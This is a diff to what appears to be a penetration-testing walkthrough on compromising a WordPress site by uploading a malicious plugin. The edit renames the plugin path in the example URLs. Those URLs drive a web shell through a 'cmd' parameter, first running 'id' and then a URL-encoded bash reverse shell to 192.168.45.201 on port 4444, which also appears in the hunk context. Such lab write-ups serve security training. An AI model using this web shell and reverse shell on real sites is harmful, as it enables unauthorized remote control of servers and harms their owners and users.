@@ -36,7 +36,7 @@ zip -r shell_plugin.zip malicious_shell_plugin/
 Once the plugin is uploaded and activated via the WordPress admin panel (or directly dropped into the `/wp-content/plugins/` directory), verify its presence:
 
 ```
-http://1337.codes/wp-content/plugins/shell_plugin/
+http://1337.codes/wp-content/plugins/malicious_shell_plugin/
 ```
 
 * * *
@@ -46,7 +46,7 @@ http://1337.codes/wp-content/plugins/shell_plugin/
 Execute a test command to verify RCE:
 
 ```
-http://1337.codes/wp-content/plugins/shell_plugin/malicious-plugin.php?cmd=id
+http://1337.codes/wp-content/plugins/malicious_shell_plugin/malicious-plugin.php?cmd=id
 ```
 
 * * *
@@ -92,7 +92,7 @@ bash%20-c%20"sh%20-i%20%3E%26%20/dev/tcp/192.168.45.201/4444%200%3E%261"
 Trigger it via browser:
 
 ```
-http://1337.codes/wp-content/plugins/shell_plugin/malicious-plugin.php?cmd=bash%20-c%20"sh%20-i%20%3E%26%20/dev/tcp/192.168.45.201/4444%200%3E%261"
+http://1337.codes/wp-content/plugins/malicious_shell_plugin/malicious-plugin.php?cmd=bash%20-c%20"sh%20-i%20%3E%26%20/dev/tcp/192.168.45.201/4444%200%3E%261"
 ```
 
 * * *
